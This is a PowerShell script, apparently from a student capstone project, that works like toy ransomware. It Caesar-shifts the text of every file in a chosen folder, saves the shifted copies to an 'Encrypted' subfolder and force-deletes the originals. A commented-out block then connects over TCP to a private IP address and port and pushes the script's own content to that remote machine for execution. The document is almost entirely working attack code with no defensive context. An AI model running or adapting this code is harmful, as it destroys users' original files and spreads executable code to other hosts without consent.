# Define the folder path and shift value
$folderPath = "D:\Drive\APranav\Capstone\Phase2\DP\test"
$shift = 25

# Get the list of files in the folder
$files = Get-ChildItem -Path $folderPath

# Create a new folder to store the encrypted contents
$encryptedFolderPath = Join-Path -Path $folderPath -ChildPath "Encrypted"
New-Item -ItemType Directory -Path $encryptedFolderPath | Out-Null

# Encrypt and save each file in the new folder
foreach ($file in $files) {
    # Read the content of the file
    $content = Get-Content -Path $file.FullName -Raw

    # Convert the content to an array of characters
    $characters = $content.ToCharArray()

    # Encrypt each character in the array
    for ($i = 0; $i -lt $characters.Length; $i++) {
        $char = $characters[$i]

        # Check if the character is a letter
        if ($char -match "[a-zA-Z]") {
            # Determine the ASCII value of the character
            $ascii = [int]$char

            # Encrypt the character using Caesar cipher
            if ($char -cmatch "[a-z]") {
                $encryptedChar = [char]((($ascii - 97 + $shift) % 26) + 97)
            }
            elseif ($char -cmatch "[A-Z]") {
                $encryptedChar = [char]((($ascii - 65 + $shift) % 26) + 65)
            }

            # Replace the character in the array with the encrypted character
            $characters[$i] = $encryptedChar
        }
    }

    # Convert the array of characters back to a string
    $encryptedContent = -join $characters

    # Determine the path for the encrypted file
    $encryptedFilePath = Join-Path -Path $encryptedFolderPath -ChildPath $file.Name

    # Save the encrypted content to the encrypted file
    $encryptedContent | Out-File -FilePath $encryptedFilePath -Encoding UTF8

    # Remove the original file
    Remove-Item -Path $file.FullName -Force
}

Write-Host "Encryption complete. Original files deleted. Encrypted files saved in: $encryptedFolderPath"


# # Define the file path, IP address, and port
# $filePath = "D:\Drive\APranav\Capstone\Phase2\DP\simple_enc.ps1"
# $ipAddress = "192.168.203.154"
# $port = 8010

# # Read the content of the script file
# $content = Get-Content -Path $filePath -Raw

# # Create a TCP client and connect to the specified IP address and port
# $client = New-Object System.Net.Sockets.TcpClient
# $client.Connect($ipAddress, $port)
# Write-Host "Connection Established."

# # Create a network stream for sending and receiving data
# $stream = $client.GetStream()

# # Convert the script content to bytes
# $scriptBytes = [System.Text.Encoding]::UTF8.GetBytes($content)

# # Send a "pull me" message to the remote system
# $pullMeMessage = [System.Text.Encoding]::UTF8.GetBytes("Pull Me (Please type 'Send')")
# $stream.Write($pullMeMessage, 0, $pullMeMessage.Length)

# # Wait for the "Send" message from the remote system
# $receiveBuffer = New-Object byte[] 1024
# $receivedData = ""
# while ($receivedData -notmatch "Send") {
#     $bytesRead = $stream.Read($receiveBuffer, 0, $receiveBuffer.Length)
#     $receivedData += [System.Text.Encoding]::UTF8.GetString($receiveBuffer, 0, $bytesRead)
# }

# # Send the script content to the remote system
# $stream.Write($scriptBytes, 0, $scriptBytes.Length)

# # Close the TCP client
# $client.Close()

# Write-Host "Script sent to ${ipAddress}:$port for execution."